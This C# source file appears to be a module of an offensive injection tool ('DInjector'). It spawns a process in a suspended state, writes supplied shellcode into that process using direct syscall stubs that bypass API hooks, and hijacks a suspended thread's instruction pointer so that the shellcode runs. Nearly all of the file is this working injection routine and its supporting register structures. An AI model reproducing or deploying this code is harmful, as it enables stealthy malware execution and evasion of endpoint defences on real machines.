using System;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class RemoteThreadContext
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Boolean CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            DI.Data.Win32.Advapi32.CREATION_FLAGS dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref DI.Data.Win32.ProcessThreadsAPI._STARTUPINFO lpStartupInfo,
            out DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            ref uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtCreateThreadEx(
            out IntPtr threadHandle,
            DI.Data.Win32.WinNT.ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtResumeThread(
            IntPtr ThreadHandle,
            ref uint SuspendCount);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtGetContextThread(
            IntPtr hThread,
            ref Registers.CONTEXT64 lpContext);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtSetContextThread(
            IntPtr hThread,
            ref Registers.CONTEXT64 lpContext);

        public static void Execute(byte[] shellcodeBytes, string processImage)
        {
            var shellcode = shellcodeBytes;

            #region CreateProcessA

            IntPtr pointer = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CreateProcessA");
            CreateProcess dCreateProcess = (CreateProcess)Marshal.GetDelegateForFunctionPointer(pointer, typeof(CreateProcess));

            DI.Data.Win32.ProcessThreadsAPI._STARTUPINFO si = new DI.Data.Win32.ProcessThreadsAPI._STARTUPINFO();
            DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION pi = new DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION();

            bool result = dCreateProcess(
                processImage,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                DI.Data.Win32.Advapi32.CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            if (result)
            {
                Console.WriteLine("(Module) [+] CreateProcess");
            }
            else
            {
                Console.WriteLine("(Module) [-] CreateProcess");
            }

            #endregion

            #region NtAllocateVirtualMemory

            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));

            IntPtr hProcess = pi.hProcess;
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            DI.Data.Native.NTSTATUS ntstatus;

            ntstatus = sysNtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtAllocateVirtualMemory");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtAllocateVirtualMemory: {ntstatus}");
            }

            #endregion

            #region NtWriteVirtualMemory

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
            NtWriteVirtualMemory sysNtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            ntstatus = sysNtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtWriteVirtualMemory");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtWriteVirtualMemory: {ntstatus}");
            }

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

            uint oldProtect = 0;

            ntstatus = sysNtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtProtectVirtualMemory");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtProtectVirtualMemory: {ntstatus}");
            }

            #endregion

            #region NtCreateThreadEx(LoadLibraryA)

            IntPtr pkernel32 = DI.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
            IntPtr loadLibraryAddr = DI.DynamicInvoke.Generic.GetExportAddress(pkernel32, "LoadLibraryA");

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
            NtCreateThreadEx sysNtCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));

            IntPtr hThread = IntPtr.Zero;

            ntstatus = sysNtCreateThreadEx(
                out hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                loadLibraryAddr,
                IntPtr.Zero,
                true, // CREATE_SUSPENDED
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtCreateThreadEx");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtCreateThreadEx: {ntstatus}");
            }

            #endregion

            #region GetThreadContext

            Registers.CONTEXT64 ctx = new Registers.CONTEXT64();
            ctx.ContextFlags = Registers.CONTEXT_FLAGS.CONTEXT_CONTROL;

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtGetContextThread");
            NtGetContextThread sysNtGetContextThread = (NtGetContextThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtGetContextThread));

            ntstatus = sysNtGetContextThread(
                hThread,
                ref ctx);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtGetContextThread");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtGetContextThread: {ntstatus}");
            }

            #endregion

            #region SetThreadContext

            ctx.Rip = (UInt64)baseAddress;

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtSetContextThread");
            NtSetContextThread sysNtSetContextThread = (NtSetContextThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtSetContextThread));

            ntstatus = sysNtSetContextThread(
                hThread,
                ref ctx);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtSetContextThread");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtSetContextThread: {ntstatus}");
            }

            #endregion

            #region NtResumeThread

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtResumeThread");
            NtResumeThread sysNtResumeThread = (NtResumeThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtResumeThread));

            uint suspendCount = 0;

            ntstatus = sysNtResumeThread(
                hThread,
                ref suspendCount);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtResumeThread");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtResumeThread: {ntstatus}");
            }

            #endregion
        }
    }

    class Registers
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            public uint Cr0NpxState;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags;

            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;

            public FLOATING_SAVE_AREA FloatSave;

            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;

            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;

            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01,
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02,
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04,
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08,
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10,
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20,
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }
    }
}
